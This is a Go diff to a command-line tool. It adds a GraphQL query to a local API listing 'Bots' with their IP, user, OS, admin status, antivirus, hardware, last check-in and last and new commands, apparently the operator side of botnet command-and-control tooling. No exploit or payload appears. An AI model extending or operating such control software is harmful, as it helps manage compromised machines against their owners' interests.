@@ -70,7 +70,6 @@ func init() {
 }
 
 func list(cmd *cobra.Command, args []string) {
-
 	if showAll, _ := cmd.Flags().GetBool("all"); showAll {
 		src := oauth2.StaticTokenSource(
 			&oauth2.Token{
@@ -144,6 +143,63 @@ func list(cmd *cobra.Command, args []string) {
 		})
 		fmt.Println(t.Render("grid"))
 	} else {
-		fmt.Println("can't do this, yet.")
+		// fmt.Println("can't do this, yet.")
+		src := oauth2.StaticTokenSource(
+			&oauth2.Token{
+				AccessToken: viper.GetString("authorization"),
+			})
+		httpclient := oauth2.NewClient(context.Background(), src)
+		client := graphql.NewClient("http://localhost:3002/api", httpclient)
+
+		var q struct {
+			Bots []struct {
+				ID                 graphql.String
+				IncludeID          graphql.String `graphql:"@include(if:$ID)"`
+				IP                 graphql.String
+				IncludeIP          graphql.String `graphql:"@include(if:$IP)"`
+				WhoAmI             graphql.String
+				IncludeWhoAmI      graphql.String `graphql:"@include(if:$WhoAmI)"`
+				OS                 graphql.String
+				IncludeOS          graphql.String `graphql:"@include(if:$OS)"`
+				InstallDate        graphql.String
+				IncludeInstallDate graphql.String `graphql:"@include(if:$InstallDate)"`
+				Admin              graphql.Boolean
+				IncludeAdmin       graphql.Boolean `graphql:"@include(if:$Admin)"`
+				AV                 graphql.String
+				IncludeAV          graphql.String `graphql:"@include(if:$AV)"`
+				CPU                graphql.String
+				IncludeCPU         graphql.String `graphql:"@include(if:$CPU)"`
+				GPU                graphql.String
+				IncludeGPU         graphql.String `graphql:"@include(if:$GPU)"`
+				Version            graphql.String
+				IncludeVersion     graphql.String `graphql:"@include(if:$Version)"`
+				LastCheckin        graphql.String
+				IncludeLastCheckin graphql.String `graphql:"@include(if:$LastCheckin)"`
+				LastCommand        graphql.String
+				IncludeLastCommand graphql.String `graphql:"@include(if:$LastCommand)"`
+				NewCommand         graphql.String
+				IncludeNewCommand  graphql.String `graphql:"@include(if:$NewCommand)"`
+			}
+		}
+		variables := map[string]interface{}{
+			"ID":          graphql.Boolean(false),
+			"IP":          graphql.Boolean(true),
+			"WhoAmI":      graphql.Boolean(true),
+			"OS":          graphql.Boolean(true),
+			"InstallDate": graphql.Boolean(true),
+			"Admin":       graphql.Boolean(true),
+			"AV":          graphql.Boolean(false),
+			"CPU":         graphql.Boolean(true),
+			"GPU":         graphql.Boolean(true),
+			"Version":     graphql.Boolean(true),
+			"LastCheckin": graphql.Boolean(true),
+			"LastCommand": graphql.Boolean(true),
+			"NewCommand":  graphql.Boolean(true),
+		}
+		if err := client.Query(context.Background(), &q, variables); err != nil {
+			fmt.Println(err)
+			return
+		}
+		fmt.Println(q.Bots[0])
 	}
 }
